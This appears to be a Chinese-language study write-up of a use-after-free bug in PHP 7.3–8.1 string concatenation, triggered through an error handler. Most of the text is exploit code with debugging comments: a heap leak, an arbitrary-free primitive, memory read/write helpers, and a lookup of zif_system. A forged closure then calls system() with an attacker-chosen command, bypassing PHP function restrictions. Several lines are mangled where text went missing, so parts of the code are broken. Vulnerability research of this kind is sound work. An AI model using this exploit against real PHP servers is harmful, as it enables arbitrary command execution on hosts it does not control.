## 1\. 简介
> PHP 7.3-8.1 中字符串连接符中有一个错误，当参数为数组时会触发错误处理，如果在错误处理回调中删除了相关资源，会造成UAF
### POC
### exp
    heap_leak(), 16);
            // concat_str_addr是'Array'+'A'*66这段字符串zend_string(占95字节内存)的地址0x7ffff3a84580，这是concat产生的结果。
            // 其字符串内容offset=16处开始是$arr原本的数组的占据的Bucket的位置，concat操作产生的result='Array'+'A'*66的zval覆盖了这个位置
            $fill = self::alloc(self::STRING_SIZE);
            // 为啥要这个操作，没有还不行
            // STRING_SIZE能分配到95字节的内存空间
            // $fill的zend_string地址是0x7ffff3a84500
            // 二者大小相同,地址紧挨,相距0x80
            // 因为调试时,有ZEND_DEBUG_BUILD声明,95字节的zend_string实际分配到了11号规格的内存,即相差0x80
            // 为什么$fill在'Array'+'A'*66的前面呢
            printf("0x%x\n",$concat_str_addr);
            $this->abc = self::alloc(self::STRING_SIZE);
            var_dump($fill);
            $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
            self::log("abc @ 0x%x", $abc_addr);
            $this->free($abc_addr);
            $this->helper = new Helper;
            if(strlen($this->abc) helper->a = "leet";
            $this->helper->b = function($x) {};
            $this->helper->c = 0xfeedface;
            $helper_handlers = $this->rel_read(0);
            self::log("helper handlers @ 0x%x", $helper_handlers);
            $closure_addr = $this->rel_read(0x20);
            self::log("real closure @ 0x%x", $closure_addr);
            $closure_ce = $this->read($closure_addr + 0x10);
            self::log("closure class_entry @ 0x%x", $closure_ce);
            $basic_funcs = $this->get_basic_funcs($closure_ce);
            self::log("basic_functions @ 0x%x", $basic_funcs);
            $zif_system = $this->get_system($basic_funcs);
            self::log("zif_system @ 0x%x", $zif_system);
            $fake_closure_off = 0x70;
            for($i = 0; $i rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
            }
            $this->rel_write($fake_closure_off + 0x38, 1, 4);
            $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
            $this->rel_write($fake_closure_off + $handler_offset, $zif_system);
            $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
            self::log("fake closure @ 0x%x", $fake_closure_addr);
            $this->rel_write(0x20, $fake_closure_addr);
            ($this->helper->b)($cmd);
            $this->rel_write(0x20, $closure_addr);
            unset($this->helper->b);
        }
        private function heap_leak() {//开始UAF
            $arr = [[], []];//首先是数组
            $buf=null;//然后是一个临时变量
            set_error_handler(function() use (&$arr, &$buf) {
                $arr = 2;//$arr原本指向的_zend_array 0x7ffff3a59a80结构被释放
                // 这一步操作会调用zend_array_destroy回收内存
                // ZEND_ASSIGN_SPEC_CV_CONST_RETVAL_UNUSED_HANDLER调用的zend_assign_to_variable中，将$arr中存储的zend_array地址视为垃圾(garbage)，调用rc_dtor_func回收
                // $arr对应的zval.value的值变为1.
                // zend_mm_free_small回收了$arr的内存，重新挂载到了slot——16,320字节大小的链表头上。
                // $arr结构的arData结构在0x7ffff3a5d288，释放的时候只是释放该Bucket结构,_zend_array存储在0x7ffff3a59a80，时9号规格的small内存，96字节
                // 使用宏HT_GET_DATA_ADDR(ht)获取到了要释放的Bucket结构,计算得0x7ffff3a5d280，$arr数组中的两个Bucket分别存放在0x7ffff3a5d288和0x7ffff3a5d2a8(一个Bucket32字节)
                // 为啥从0x7ffff3a5d280跟前开始释放呢，$arr时pack array，不需要索引数组，所以其只有两个单位的值为-1的索引数组，索引数组一个solt占4个字节，两个就是8字节
                // 索引数组就在Bucket的签名，通过相关size的计算可以得出索引数组的大小，这里算得索引数组的大小为2，所以最后释放的地址就是0x7ffff3a5d280，其offset=8的位置就是arData，即第一个Bucket
                // 这个未初始化的数组是在编译阶段就分配的，分配Bucket时，最少一次分配8个，每个32B，共256B再加上8个字节的索引数组，共计264B，能容纳这么多最小规格时16号320B大小的small内存
                // zend_string头有24字节，分配255长度的字符串内存，共计需要279B，也会分配到16号规格内存，如此，UAF的条件达到
                // 调用栈
    /* 
    zend_mm_free_small(zend_mm_heap * heap, void * ptr, int bin_num) (\home\xxxxx\php-src\Zend\zend_alloc.c:1280)
    zend_mm_free_heap(zend_mm_heap * heap, void * ptr, const char * __zend_filename, const uint32_t __zend_lineno, const char * __zend_orig_filename, const uint32_t __zend_orig_lineno) (\home\xxxxx\php-src\Zend\zend_alloc.c:1370)
    _efree(void * ptr, const char * __zend_filename, const uint32_t __zend_lineno, const char * __zend_orig_filename, const uint32_t __zend_orig_lineno) (\home\xxxxx\php-src\Zend\zend_alloc.c:2549)
    zend_array_destroy(HashTable * ht) (\home\xxxxx\php-src\Zend\zend_hash.c:1635)
    rc_dtor_func(zend_refcounted * p) (\home\xxxxx\php-src\Zend\zend_variables.c:57)
    zend_assign_to_variable(zval * variable_ptr, zval * value, zend_uchar value_type, zend_bool strict) (\home\xxxxx\php-src\Zend\zend_execute.h:131)
    ZEND_ASSIGN_SPEC_CV_CONST_RETVAL_UNUSED_HANDLER() (\home\xxxxx\php-src\Zend\zend_vm_execute.h:40771)
    execute_ex(zend_execute_data * ex) (\home\xxxxx\php-src\Zend\zend_vm_execute.h:57205)
    zend_call_function(zend_fcall_info * fci, zend_fcall_info_cache * fci_cache) (\home\xxxxx\php-src\Zend\zend_execute_API.c:812)
    _call_user_function_ex(zval * object, zval * function_name, zval * retval_ptr, uint32_t param_count, zval * params, int no_separation) (\home\xxxxx\php-src\Zend\zend_execute_API.c:644)
    zend_error_va_list(int type, const char * error_filename, uint32_t error_lineno, const char * format, struct __va_list_tag * args) (\home\xxxxx\php-src\Zend\zend.c:1366)
    zend_error(int type, const char * format) (\home\xxxxx\php-src\Zend\zend.c:1480)
    __zval_get_string_func(zval * op, zend_bool try) (\home\xxxxx\php-src\Zend\zend_operators.c:889)
    zval_get_string_func(zval * op) (\home\xxxxx\php-src\Zend\zend_operators.c:925)
    concat_function(zval * result, zval * op1, zval * op2) (\home\xxxxx\php-src\Zend\zend_operators.c:1829)
    zend_binary_op(zval * ret, zval * op1, zval * op2) (\home\xxxxx\php-src\Zend\zend_execute.c:1312)
    ZEND_ASSIGN_DIM_OP_SPEC_CV_CONST_HANDLER() (\home\xxxxx\php-src\Zend\zend_vm_execute.h:39117)
    execute_ex(zend_execute_data * ex) (\home\xxxxx\php-src\Zend\zend_vm_execute.h:57109)
    zend_execute(zend_op_array * op_array, zval * return_value) (\home\xxxxx\php-src\Zend\zend_vm_execute.h:57913)
    zend_execute_scripts(int type, zval * retval, int file_count) (\home\xxxxx\php-src\Zend\zend.c:1665)
        */
                $buf = str_repeat("\x00", self::HT_STRING_SIZE);//0x118-0x18-0x01长度的0x00 0x00ff即255长度的字符串,这个字符串覆盖了_zend_array结构体
                // 经过对原来的arr结构地址设置数据更改断点发现，arr原本的位置被str_repeat函数操作时覆盖
                // 在一次调试中，_zend_array存储在0x7ffff3a59a80，这是一个哈希表，arData存储在0x7ffff3a5d288，Bucket长度2
                // 新分配的字符串长度255，占空间287，emalloc得到地址0x7ffff3a5d280
                // 该地址在16号规格small内存中,320B
            // // 此时得到的$buf的字符串内容就存储在和$arr的Bucket一样的位置，concat的错误使得该匿名函数被调用，即ZEND_ERROR被执行，ZEND_ERROR执行后实际继续返回到concat的后续过程开始执行
            });
            $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
            // op2是长度为一个96（0x60）标准存储单元大小的zend_string结构体，op1是zval_struct结构体
            //op1是数组，op2是字符串，concat时，引发错误，掉头error handler的回调函数，$arr变量的内存指向zval_struct，
            //offset+0偏移处的成员是一个_zend_array结构体的地址，现在其值就是1，数字1，一个64位地址，里面只有1。
            //在这一部操作中，op1是引用类型的值，handler发现其是引用，就提取出它引用的内容，发现是一个数组，然后调用宏SEPARATE_ARRAY来分离数组
            // 引用计数只有1时，分离操作不起作用，否则，垃圾回收机制会删除一次引用
            // 在赋值操作实际执行时，$arr所代表的数组被提取出来作为实际操作数
            // 对于的handler是ASSIGN_DIM_OP，操作数 op1是$arr,op2是1,根据指令的特点，该handler会调用下一条指令的数据，OP_DATA的操作数，及alloc产生的字符串
            // 于是 op1是$arr[1]，是数组，op2是字符串'\x00'*255
            // 因为op1的是array，所以触发ZEND_ERROR
            // zend_fetch_dimension_address_inner_RW_CONST，handler调用该函数在哈希表中对数组取值
            // $arr[1]的地址在0x7ffff3a5d2a8
            /*  */
            // ZEND_ERROR执行后，__zval_get_string_func返回一个zend_known_strings的地址，其内容时Array，并赋给了op1_copy，暂存op1，（此时真正的op1已经被字符串覆盖了）
            // 因为时.=这种自操作，所以指令中的result和op1的地址相同，对result的操作就是对op1的操作
            // op1_copy得到值后，op1_copy的地址被赋回op1，即op1表示zend_known_strings，即"Array"的地址
            // 此时，result指向"\x00"*255的zval，op2指向66字节长度的alloc函数产生的字符串，最终concat_function返回了'Array'+'A'*66这段字符串，$buf的zval.value也指向了新分配的存储这块内存
            // $buf的zval.value本来是全0，$buf本身的结构在0x7ffff3a5d280，但是op1的引用在0x7ffff3a5d2a8，有40个字节的偏移
            // 执行这句ZVAL_NEW_STR(result, result_str)时，0x7ffff3a5d2a8的zval.value被赋值，指向'Array'+'A'*66这段字符串zend_string
            // 此时我读取$buf的字符串偏移$buf[16]处起始的8个字节就是'Array'+'A'*66这段字符串zend_string的地址
            // offset=16因为$buf在0x7ffff3a5d280，result在0x7ffff3a5d2a8，相差40字节，除去0x7ffff3a5d280开始的24字节字符串zend_string的头外，再偏移16字节就是reslut,即'Array'+'A'*66这段字符串zval。
            file_put_contents("/mnt/c/Users/L1sper/Desktop/1.bin",$buf);
            return $buf;
        }
        private function free($addr) {
            $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr); 
            $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));
            $arr = [[], []];
            set_error_handler(function() use (&$arr, &$buf, &$payload) {
                $arr = 1;
                $buf = str_repeat($payload, 1);
            });
            $arr[1] .= "x";
        }
        private function rel_read($offset) {
            return self::str2ptr($this->abc, $offset);
        }
        private function rel_write($offset, $value, $n = 8) {
            for ($i = 0; $i abc[$offset + $i] = chr($value & 0xff);
                $value >>= 8;
            }
        }
        private function read($addr, $n = 8) {
            $this->rel_write(0x10, $addr - 0x10);
            $value = strlen($this->helper->a);
            if($n !== 8) { $value &= (1 read($addr);
                $f_name = $this->read($f_entry, 6);
                if($f_name === 0x6d6574737973) {
                    return $this->read($addr + 8);
                }
                $addr += 0x20;
            } while($f_entry !== 0);
        }
        private function get_basic_funcs($addr) {
            while(true) {
                // In rare instances the standard module might lie after the addr we're starting
                // the search from. This will result in a SIGSGV when the search reaches an unmapped page.
                // In that case, changing the direction of the search should fix the crash.
                // $addr += 0x10;
                $addr -= 0x10;
                if($this->read($addr, 4) === 0xA8 &&
                    in_array($this->read($addr + 4, 4),
                        [20180731, 20190902, 20200930, 20210902])) {
                    $module_name_addr = $this->read($addr + 0x20);
                    $module_name = $this->read($module_name_addr);
                    if($module_name === 0x647261646e617473) {
                        self::log("standard module @ 0x%x", $addr);
                        return $this->read($addr + 0x28);
                    }